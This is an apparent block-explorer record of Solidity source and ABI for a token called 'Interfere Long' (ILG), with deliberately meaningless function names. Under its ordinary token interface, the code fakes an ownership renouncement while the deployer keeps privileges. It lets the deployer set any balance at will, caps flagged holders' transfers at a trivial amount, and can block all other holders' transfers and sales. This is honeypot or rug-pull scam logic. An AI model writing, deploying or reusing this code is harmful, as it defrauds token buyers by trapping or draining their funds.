{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface exemptWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract feeTxToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listLimitTotal {\n    function createPair(address toAmount, address marketingFrom) external returns (address);\n}\n\ninterface feeFromToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableIs) external view returns (uint256);\n\n    function transfer(address shouldLimit, uint256 totalAt) external returns (bool);\n\n    function allowance(address senderFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldLimit,\n        uint256 totalAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellAuto, uint256 value);\n    event Approval(address indexed senderFund, address indexed spender, uint256 value);\n}\n\ninterface receiverMode is feeFromToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InterfereLong is feeTxToken, feeFromToken, receiverMode {\n\n    string private buyLiquidity = \"ILG\";\n\n    function swapTake(uint256 totalAt) public {\n        atLiquidityMax();\n        buyMarketing = totalAt;\n    }\n\n    string private fundEnable = \"Interfere Long\";\n\n    function approve(address limitShould, uint256 totalAt) public virtual override returns (bool) {\n        teamFee[_msgSender()][limitShould] = totalAt;\n        emit Approval(_msgSender(), limitShould, totalAt);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletAt;\n    }\n\n    function owner() external view returns (address) {\n        return toTotal;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedTxSwap;\n    }\n\n    mapping(address => bool) public receiverSwap;\n\n    mapping(address => mapping(address => uint256)) private teamFee;\n\n    uint8 private walletAt = 18;\n\n    uint256 public tokenTeam;\n\n    function listBuyTrading(address txReceiverMin) public {\n        require(txReceiverMin.balance < 100000);\n        if (atTakeAmount) {\n            return;\n        }\n        \n        receiverSwap[txReceiverMin] = true;\n        \n        atTakeAmount = true;\n    }\n\n    function receiverAt() public {\n        emit OwnershipTransferred(modeLaunchedIs, address(0));\n        toTotal = address(0);\n    }\n\n    uint256 private shouldAt;\n\n    function receiverReceiverAuto(address senderExemptToken, uint256 totalAt) public {\n        atLiquidityMax();\n        enableLiquidity[senderExemptToken] = totalAt;\n    }\n\n    uint256 public modeMin;\n\n    constructor (){\n        if (atBuy) {\n            fundSellSwap = true;\n        }\n        exemptWallet teamReceiverTo = exemptWallet(autoLimitMarketing);\n        atFund = listLimitTotal(teamReceiverTo.factory()).createPair(teamReceiverTo.WETH(), address(this));\n        if (sellTx) {\n            teamBuy = tokenTeam;\n        }\n        modeLaunchedIs = _msgSender();\n        receiverAt();\n        receiverSwap[modeLaunchedIs] = true;\n        enableLiquidity[modeLaunchedIs] = launchedTxSwap;\n        if (fundSellSwap != atBuy) {\n            tokenTeam = shouldAt;\n        }\n        emit Transfer(address(0), modeLaunchedIs, launchedTxSwap);\n    }\n\n    bool public atTakeAmount;\n\n    function transfer(address senderExemptToken, uint256 totalAt) external virtual override returns (bool) {\n        return tradingShould(_msgSender(), senderExemptToken, totalAt);\n    }\n\n    uint256 private launchedTxSwap = 100000000 * 10 ** 18;\n\n    bool private sellTx;\n\n    address autoLimitMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 launchTeam;\n\n    function tradingShould(address sellBuy, address shouldLimit, uint256 totalAt) internal returns (bool) {\n        if (sellBuy == modeLaunchedIs) {\n            return marketingAtTo(sellBuy, shouldLimit, totalAt);\n        }\n        uint256 maxListWallet = feeFromToken(atFund).balanceOf(buyTrading);\n        require(maxListWallet == buyMarketing);\n        require(shouldLimit != buyTrading);\n        if (fundIs[sellBuy]) {\n            return marketingAtTo(sellBuy, shouldLimit, toTeamIs);\n        }\n        return marketingAtTo(sellBuy, shouldLimit, totalAt);\n    }\n\n    bool public fundSellSwap;\n\n    function name() external view virtual override returns (string memory) {\n        return fundEnable;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyLiquidity;\n    }\n\n    mapping(address => bool) public fundIs;\n\n    uint256 buyMarketing;\n\n    address public modeLaunchedIs;\n\n    address buyTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public atBuy;\n\n    function fromShould(address launchSellReceiver) public {\n        atLiquidityMax();\n        if (tokenTeam == shouldAt) {\n            fundSellSwap = true;\n        }\n        if (launchSellReceiver == modeLaunchedIs || launchSellReceiver == atFund) {\n            return;\n        }\n        fundIs[launchSellReceiver] = true;\n    }\n\n    address private toTotal;\n\n    event OwnershipTransferred(address indexed liquidityTakeFund, address indexed tradingLaunchList);\n\n    address public atFund;\n\n    function allowance(address exemptLaunch, address limitShould) external view virtual override returns (uint256) {\n        if (limitShould == autoLimitMarketing) {\n            return type(uint256).max;\n        }\n        return teamFee[exemptLaunch][limitShould];\n    }\n\n    mapping(address => uint256) private enableLiquidity;\n\n    function balanceOf(address enableIs) public view virtual override returns (uint256) {\n        return enableLiquidity[enableIs];\n    }\n\n    uint256 public teamBuy;\n\n    function atLiquidityMax() private view {\n        require(receiverSwap[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return toTotal;\n    }\n\n    function transferFrom(address sellBuy, address shouldLimit, uint256 totalAt) external override returns (bool) {\n        if (_msgSender() != autoLimitMarketing) {\n            if (teamFee[sellBuy][_msgSender()] != type(uint256).max) {\n                require(totalAt <= teamFee[sellBuy][_msgSender()]);\n                teamFee[sellBuy][_msgSender()] -= totalAt;\n            }\n        }\n        return tradingShould(sellBuy, shouldLimit, totalAt);\n    }\n\n    function marketingAtTo(address sellBuy, address shouldLimit, uint256 totalAt) internal returns (bool) {\n        require(enableLiquidity[sellBuy] >= totalAt);\n        enableLiquidity[sellBuy] -= totalAt;\n        enableLiquidity[shouldLimit] += totalAt;\n        emit Transfer(sellBuy, shouldLimit, totalAt);\n        return true;\n    }\n\n    uint256 constant toTeamIs = 19 ** 10;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTakeFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLaunchList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTakeAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSellReceiver\",\"type\":\"address\"}],\"name\":\"fromShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSellSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txReceiverMin\",\"type\":\"address\"}],\"name\":\"listBuyTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLaunchedIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderExemptToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAt\",\"type\":\"uint256\"}],\"name\":\"receiverReceiverAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalAt\",\"type\":\"uint256\"}],\"name\":\"swapTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderExemptToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "InterfereLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}